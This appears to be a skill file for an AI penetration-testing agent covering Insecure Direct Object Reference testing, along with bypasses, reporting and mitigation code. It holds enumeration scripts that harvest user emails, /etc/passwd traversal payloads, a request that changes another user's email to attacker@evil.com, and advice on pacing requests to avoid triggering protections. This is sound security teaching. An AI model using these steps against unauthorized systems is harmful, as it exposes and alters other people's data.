---
name: idor-testing
description: Specialized skill and methodology for testing Insecure Direct Object Reference (IDOR)
version: 1.0.0
---

# IDOR (Insecure Direct Object Reference) Testing

## Overview

IDOR (Insecure Direct Object Reference) is an access control flaw that occurs when an application uses user-supplied input directly to access resources without verifying that the user is authorized to access them. This skill covers detection, exploitation, and remediation of IDOR vulnerabilities.

## How the Vulnerability Works

The application references resources through predictable identifiers (such as IDs or file names) without verifying that the current user is authorized to access them.

**Vulnerable code example:**
```php
// Use the user-supplied ID directly
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## Testing Methodology

### 1. Identify Direct Object References

**Common resource types:**
- User IDs
- File IDs / file names
- Order IDs
- Document IDs
- Account IDs
- Record IDs

**Common locations:**
- URL parameters
- POST data
- Cookie values
- HTTP headers
- File paths

### 2. Enumeration Testing

**Sequential ID testing:**
```
/user?id=1
/user?id=2
/user?id=3
```

**UUID testing:**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**File name testing:**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. Horizontal Privilege Testing

**Accessing other users' resources:**
```
Current user ID: 100
Test: /user?id=101
Test: /user?id=102
```

**Accessing other users' files:**
```
/files/user100_document.pdf
Test: /files/user101_document.pdf
```

### 4. Vertical Privilege Testing

**Regular user accessing administrator resources:**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## Exploitation Techniques

### User Information Disclosure

**Enumerating user profiles:**
```bash
# Enumerate sequentially
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# Observe response differences
```

### File Access

**Accessing other users' files:**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**Combined with directory traversal:**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### Data Modification

**Modifying other users' data:**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### Bulk Operations

**Bulk data retrieval:**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## Bypass Techniques

### ID Obfuscation

**Base64 encoding:**
```
Original ID: 123
Encoded: MTIz
URL: /user?id=MTIz
```

**Hash values:**
```
Original ID: 123
Hash: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### Parameter Name Obfuscation

**Trying different parameter names:**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### HTTP Method Bypass

**Trying different HTTP methods:**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### Path Obfuscation

**Trying different paths:**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## Tooling

### Burp Suite

**Using Intruder:**
1. Intercept the request
2. Send to Intruder
3. Mark the ID parameter
4. Use a numeric sequence or a custom list
5. Observe response differences

**Using Repeater:**
1. Modify the ID manually
2. Test different values
3. Observe the responses

### OWASP ZAP

```bash
# Run an IDOR scan with ZAP
zap-cli active-scan --scanners all http://target.com
```

### Python Scripts

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## Verification and Reporting

### Verification Steps

1. Confirm that unauthorized resources are accessible
2. Verify that other users' data can be read, modified, or deleted
3. Assess the impact (data leakage, privacy violation, etc.)
4. Document the full PoC
5. Record the confirmed vulnerability in the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Points

- Vulnerability location and resource identifiers
- Unauthorized resources that are accessible
- Full exploitation steps and PoC
- Remediation advice (access control, resource mapping, etc.)

## Mitigations

### Recommended Approaches

1. **Access control verification**
   ```python
   def get_user_data(user_id, current_user_id):
       # Verify permission
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
       # Return the data
       return db.get_user(user_id)
   ```

2. **Indirect object references**
   ```python
   # Use a mapping table
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **Role-based access control**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **Resource ownership verification**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
       # Verify ownership
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
       # Update the data
       db.update_user(user_id, data)
   ```

5. **Unpredictable identifiers**
   ```python
   import uuid
   
   # Use a UUID instead of a sequential ID
   resource_id = str(uuid.uuid4())
   ```

6. **Least privilege**
   - Only return data the user is authorized to access
   - Apply data filtering
   - Limit the range of accessible resources

## Notes

- Test only in an authorized testing environment
- Avoid accessing or modifying real user data
- Be aware of access control differences across resource types
- Watch the request rate during testing to avoid triggering protections
